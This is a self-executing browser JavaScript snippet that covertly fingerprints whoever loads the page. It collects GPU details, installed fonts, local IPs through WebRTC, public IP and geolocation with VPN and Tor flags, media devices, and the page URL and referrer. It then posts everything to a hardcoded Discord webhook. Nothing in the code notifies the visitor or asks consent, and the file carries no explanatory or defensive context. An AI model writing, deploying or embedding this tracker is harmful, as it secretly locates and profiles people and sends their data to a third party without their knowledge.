(() => {
  const collectWindowsData = async () => {
    const getWebGLInfo = () => {
      try {
        const canvas = document.createElement("canvas");
        const gl =
          canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return null;
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        return {
          renderer: debugInfo
            ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            : null,
          vendor: debugInfo
            ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
            : null,
          maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
          shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
          version: gl.getParameter(gl.VERSION),
        };
      } catch (e) {
        return null;
      }
    };

    const getFonts = () => {
      const fontList = [
        "Arial",
        "Arial Black",
        "Courier New",
        "Times New Roman",
        "Georgia",
        "Verdana",
        "Helvetica",
        "Comic Sans MS",
        "Impact",
        "Lucida Console",
        "Tahoma",
        "Trebuchet MS",
      ];
      const span = document.createElement("span");
      span.style.fontSize = "72px";
      span.innerHTML = "mmmmmmmmmml";
      document.body.appendChild(span);
      const defaultWidth = span.offsetWidth;
      const availableFonts = fontList.filter((font) => {
        span.style.fontFamily = font;
        return span.offsetWidth !== defaultWidth;
      });
      document.body.removeChild(span);
      return availableFonts;
    };

    const getLocalIPs = async () => {
      try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        return offer.sdp
          .split("\n")
          .filter((line) => line.includes("candidate"))
          .map((line) => line.split(" "))
          .filter((parts) => parts[7] === "host")
          .map((parts) => parts[4]);
      } catch (e) {
        return null;
      }
    };

    const data = {
      system: {
        windowsVersion:
          navigator.userAgent.match(/Windows NT (\d+\.\d+)/)?.[1] || null,
        edgeHTMLVersion:
          navigator.userAgent.match(/Edge\/(\d+\.\d+)/)?.[1] || null,
        touchSupport: navigator.maxTouchPoints > 0,
        msManipulationViewsEnabled: "msManipulationViewsEnabled" in navigator,
        msMaxTouchPoints: navigator.msMaxTouchPoints || null,
        windowsTheme: window.matchMedia("(prefers-color-scheme: dark)").matches
          ? "dark"
          : "light",
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        cpuClass: navigator.cpuClass || null,
        deviceMemory: navigator.deviceMemory || null,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        pdfViewerEnabled: navigator.pdfViewerEnabled || false,
        webdriver: navigator.webdriver || false,
        product: navigator.product,
        productSub: navigator.productSub,
        appName: navigator.appName,
        appVersion: navigator.appVersion,
        appCodeName: navigator.appCodeName,
      },
      ipInfo: await fetch("https://ipwho.is/")
        .then((r) => r.json())
        .catch(() => null),
      display: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation?.type,
        devicePixelRatio: window.devicePixelRatio,
      },
      hardware: {
        webgl: getWebGLInfo(),
        fonts: getFonts(),
        audio: !!window.AudioContext || !!window.webkitAudioContext,
        video: !!navigator.mediaCapabilities?.decodingInfo,
        devices: navigator.mediaDevices
          ? await navigator.mediaDevices.enumerateDevices().catch(() => [])
          : [],
        touch: "ontouchstart" in window,
        pointer: window.PointerEvent ? true : false,
        motion: window.DeviceMotionEvent ? true : false,
        orientation: window.DeviceOrientationEvent ? true : false,
      },
      network: {
        connection: navigator.connection
          ? {
              type: navigator.connection.type,
              effectiveType: navigator.connection.effectiveType,
              downlink: navigator.connection.downlink,
              rtt: navigator.connection.rtt,
              saveData: navigator.connection.saveData,
            }
          : null,
        localIPs: await getLocalIPs(),
      },
      time: {
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        offset: new Date().getTimezoneOffset(),
        timestamp: Date.now(),
        performance: performance.now(),
      },
      storage: {
        localStorageEnabled: !!window.localStorage,
        sessionStorageEnabled: !!window.sessionStorage,
        cookies: document.cookie.length > 0,
        indexedDB: !!window.indexedDB,
        serviceWorker: !!navigator.serviceWorker,
      },
      session: {
        referrer: document.referrer,
        url: window.location.href,
        origin: window.location.origin,
        protocol: window.location.protocol,
        host: window.location.host,
        hostname: window.location.hostname,
        port: window.location.port,
        pathname: window.location.pathname,
        search: window.location.search,
        hash: window.location.hash,
        timestamp: new Date().toISOString(),
      },
    };

    const createEmbed = (title, color, fields) => ({
      title,
      color,
      fields,
      footer: { text: `Collected at ${new Date().toUTCString()}` },
    });

    const embeds = [
      createEmbed("🌐 User Information Summary", 0x3498db, [
        {
          name: "📍 Location",
          value: `${data.ipInfo?.city || "Unknown"}, ${
            data.ipInfo?.country || "Unknown"
          }`,
          inline: true,
        },
        {
          name: "🆔 IP Address",
          value: data.ipInfo?.ip || "Unknown",
          inline: true,
        },
        { name: "🌐 ISP", value: data.ipInfo?.isp || "Unknown", inline: true },
        {
          name: "🖥️ System",
          value: `${data.system.platform || "Unknown"} | ${
            data.system.windowsVersion || "Unknown OS"
          }`,
          inline: true,
        },
        {
          name: "🔍 Browser",
          value: data.system.userAgent.split(") ")[0] + ")",
          inline: true,
        },
        {
          name: "🕒 Timezone",
          value: data.time.timezone || "Unknown",
          inline: true,
        },
      ]),
      createEmbed("🛡️ System Information", 0x5dade2, [
        {
          name: "OS Version",
          value: data.system.windowsVersion || "Unknown",
          inline: true,
        },
        {
          name: "Platform",
          value: data.system.platform || "Unknown",
          inline: true,
        },
        {
          name: "Device Memory",
          value: `${data.system.deviceMemory || "Unknown"} GB`,
          inline: true,
        },
        {
          name: "CPU Cores",
          value: String(data.system.hardwareConcurrency),
          inline: true,
        },
        {
          name: "Touch Support",
          value: data.system.touchSupport ? "Yes" : "No",
          inline: true,
        },
        {
          name: "System Theme",
          value: data.system.windowsTheme || "Unknown",
          inline: true,
        },
      ]),
      createEmbed("🖥️ Hardware Details", 0x58d68d, [
        {
          name: "GPU Renderer",
          value: data.hardware.webgl?.renderer || "Unknown",
          inline: true,
        },
        {
          name: "GPU Vendor",
          value: data.hardware.webgl?.vendor || "Unknown",
          inline: true,
        },
        {
          name: "Screen Resolution",
          value: `${data.display.width}x${data.display.height}`,
          inline: true,
        },
        {
          name: "Color Depth",
          value: `${data.display.colorDepth}-bit`,
          inline: true,
        },
        {
          name: "Touch Support",
          value: data.hardware.touch ? "Yes" : "No",
          inline: true,
        },
        {
          name: "Motion Sensors",
          value: data.hardware.motion ? "Yes" : "No",
          inline: true,
        },
      ]),
      createEmbed("🌐 Network Information", 0xf39c12, [
        {
          name: "Public IP",
          value: data.ipInfo?.ip || "Unknown",
          inline: true,
        },
        {
          name: "Local IPs",
          value: data.network.localIPs?.join(", ") || "Unknown",
          inline: true,
        },
        {
          name: "Connection Type",
          value: data.network.connection?.type || "Unknown",
          inline: true,
        },
        {
          name: "Network Speed",
          value: data.network.connection?.effectiveType || "Unknown",
          inline: true,
        },
        {
          name: "VPN Detected",
          value: data.ipInfo?.vpn ? "Yes" : "No",
          inline: true,
        },
        {
          name: "TOR Detected",
          value: data.ipInfo?.tor ? "Yes" : "No",
          inline: true,
        },
      ]),
    ];

    fetch(
      "https://discord.com/api/webhooks/1401997242511917086/duk9-WwJDKSCC111Sj2g16IvnwFCvQjNjlsVHfdE5suHDAGbOfQ0AVPoi8W8Pj-zZz__",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "System Information Collector",
          avatar_url: "https://i.imgur.com/ABC123.png",
          embeds: embeds,
        }),
      }
    );
  };

  collectWindowsData();
})();
